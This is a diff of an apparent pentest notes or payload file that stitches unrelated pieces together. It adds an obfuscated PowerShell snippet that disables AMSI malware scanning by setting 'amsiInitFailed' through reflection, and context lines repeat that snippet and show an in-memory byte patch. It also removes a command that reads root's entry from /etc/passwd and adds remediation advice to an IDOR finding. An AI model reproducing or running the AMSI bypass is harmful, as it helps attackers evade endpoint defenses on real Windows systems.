@@ -29,7 +29,9 @@ $KTMJX = [Byte[]] ($TLML, $PURX, $YNWL, $RTGX, + $XVON, + $WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 
 ==========================================================================
-grep "^root:" /etc/passwd | cut -f4 -d: 
+S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
+(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})
+
 
 S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));(Get-varI`A`BLE(('1Q'+'2U')+'zX')-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')))."g`etf`iElD"(("{0}{2}{1}"-f('a'+'msi'),'d',('I'+'nitF'+'aile')),("{2}{4}{0}{1}{3}"-f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})
 
@@ -62,6 +64,8 @@ Description: Insecure Direct Object Reference (IDOR) via transaction ID manipula
 Impact: This vulnerability can lead to unauthorized access to sensitive financial information, privacy violations, and potential regulatory non-compliance. Attackers can exploit this to view, modify, or manipulate transaction data of other users, leading to severe data breaches and loss of user trust.
 
 Remediation: Implement strict authorization checks to verify that the requesting user has permission to access the specified transaction. Use indirect references or opaque identifiers for transactions instead of direct IDs. Regularly review and test the application for IDOR vulnerabilities.
+
+Implement strict authorization checks to ensure that the requesting user has permission to access the specified transaction. Use indirect references or opaque identifiers for transaction IDs instead of direct IDs. Secure URL and API endpoints to prevent exposure of sensitive information. Validate and sanitize all input parameters to prevent manipulation. Employ session tokens and access control mechanisms, such as ACLs or RBAC, to manage permissions.
 
 Reference:
 
